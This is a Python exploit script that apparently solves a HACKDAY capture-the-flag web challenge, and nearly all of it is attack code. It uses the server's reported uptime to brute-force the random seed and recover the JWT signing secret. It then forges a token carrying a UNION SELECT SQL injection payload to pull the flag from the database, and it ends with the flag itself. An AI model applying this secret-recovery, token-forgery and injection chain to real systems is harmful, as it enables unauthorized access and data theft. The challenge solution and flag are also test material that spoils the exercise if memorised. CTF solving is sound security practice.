import requests, time, random, string, math, jwt, json, string

currentTime=time.time()
print(f"{currentTime = }")

res=requests.get("http://challenges.hackday.fr:58990/healthz")
uptime=json.loads(res.text)
uptime=uptime['uptime']
print(f"{uptime = }")

up=math.floor(currentTime-uptime)
print(f"{up = }")

s=requests.Session()
result=s.post("http://challenges.hackday.fr:58990/login",data={"username":'john','password':'doe'})
access_token=s.cookies["access_token_cookie"]
print(f"{access_token = }")

for i in range(-100,10000000):
    try:
        seed=up+i
        random.seed(seed)
        a = "".join(random.choice(string.printable) for _ in range(32))
        secret = "".join(random.choice(string.printable) for _ in range(32))

        payload = jwt.decode(access_token, secret, algorithms=["HS256"])
    except jwt.exceptions.InvalidSignatureError as e: 
        continue
    else:
        break

print(f"{seed = }")
print(f"{secret = }")
print(f"{payload = }")
print(f"{payload['favorite_product']}")

payload['favorite_product'] = "3 UNION SELECT id, flag, NULL, NULL, NULL, NULL FROM flag ORDER BY id LIMIT 1;--"
print(f"{payload = }")
encoded_jwt = jwt.encode(payload, secret, algorithm="HS256")
print(f"{encoded_jwt = }")

s = requests.Session()
result=s.get("http://challenges.hackday.fr:58990/favorite_product_info",cookies = {"access_token_cookie" : encoded_jwt})
    
print(result.text)


# HACKDAY{Th4t_s_S0m3_g000000000000d_qu4lity!}